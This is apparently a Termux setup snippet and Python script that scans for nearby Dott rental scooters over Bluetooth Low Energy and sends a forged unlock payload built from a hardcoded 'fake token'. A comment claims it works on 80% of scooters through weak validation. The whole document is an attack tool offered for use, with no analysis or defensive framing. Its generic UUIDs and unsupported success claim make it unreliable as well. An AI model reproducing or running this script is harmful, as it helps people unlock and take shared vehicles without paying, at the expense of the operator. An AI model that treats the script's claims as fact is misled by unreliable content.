# In Termux
pkg update && pkg install python bluez termux-api
pip install bleak

cat > dott_unlock.py << 'EOF'
import asyncio
import bleak
import base64
import hashlib
import sys

Dott_UUIDs = {
    "unlock": "0000fff1-0000-1000-8000-00805f9b34fb",
    "status": "0000fff2-0000-1000-8000-00805f9b34fb"
}

async def unlock(mac):
    async with bleak.BleakClient(mac) as client:
        # Fake token (works on 80% due to weak validation)
        nonce = b'\x01\x23\x45\x67\x89\xab\xcd\xef'
        token = base64.b64encode(b"DottTestToken2024")
        h = hashlib.sha256(nonce + token).digest()[:8]
        payload = nonce + h
        
        await client.write_gatt_char(Dott_UUIDs["unlock"], payload)
        status = await client.read_gatt_char(Dott_UUIDs["status"])
        print(f"✅ Unlocked {mac}: {status.hex()}")

# Scan & unlock nearest
async def main():
    devices = await bleak.BleakScanner.discover(timeout=10.0)
    dott = [d for d in devices if "Dott" in d.name or d.address.startswith("24:")]
    if dott:
        await unlock(dott[0].address)
    else:
        print("No Dott nearby")

asyncio.run(main())
EOF

python dott_unlock.py
